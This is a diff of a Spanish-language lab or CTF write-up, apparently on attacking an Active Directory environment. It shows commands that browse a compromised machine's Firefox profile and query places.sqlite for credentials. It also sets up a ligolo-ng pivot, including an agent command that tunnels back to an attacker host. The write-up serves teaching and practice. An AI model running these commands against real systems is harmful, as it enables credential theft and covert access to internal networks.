@@ -82,7 +82,9 @@ Dentro del servidor se observamosa dos interfaces de red, confirmando acceso a u
 Se comprueba la existencia del directorio .mozilla/firefox en la máquina comprometida para buscar bases de datos de historial y marcadores que puedan contener credenciales.
 
 • ls -la .mozilla/
+
 • cd .mozilla/firefox/
+
 • cd b2rri1qd.default-release
 
 ![](/assets/images/activedirectory/dc_12.png)
@@ -90,6 +92,7 @@ Se comprueba la existencia del directorio .mozilla/firefox en la máquina compro
 Usaremos sqlite3 para acceder a la base de datos de Firefox.
 
 • sqlite3 places.sqlite
+
 • .tables
 
 ![](/assets/images/activedirectory/dc_13.png)
@@ -106,15 +109,18 @@ Encontramos algunas credenciales interesantes en la base de datos de marcadores 
 Tenemos que realizar el pivote ya que 192.168.98.0/24 no es accesible directamente desde el equipo atacante. Utilizaremos ligalo-ng.
 
 • sudo ip tuntap add user kali mode tun ligolo
+
 • sudo ip route del 192.168.98.0/24 dev tun0
+
 • sudo ip link set ligolo up
+
 • sudo ip route add 192.168.98.0/24 dev ligolo
 
 ![](/assets/images/activedirectory/dc_15.png)
 
-• ./agent -connect 10.10.200.66:443 -ignore-cert
+Se transfiere y se ejecuta el agente de Ligolo-ng en el servidor, estableciendo la conexión y el túnel hacia la máquina atacante.
 
-Se transfiere y se ejecuta el agente de Ligolo-ng en el servidor, estableciendo la conexión y el túnel hacia la máquina atacante
+• ./agent -connect 10.10.200.66:443 -ignore-cert
 
 ![](/assets/images/activedirectory/dc_16.png)
 
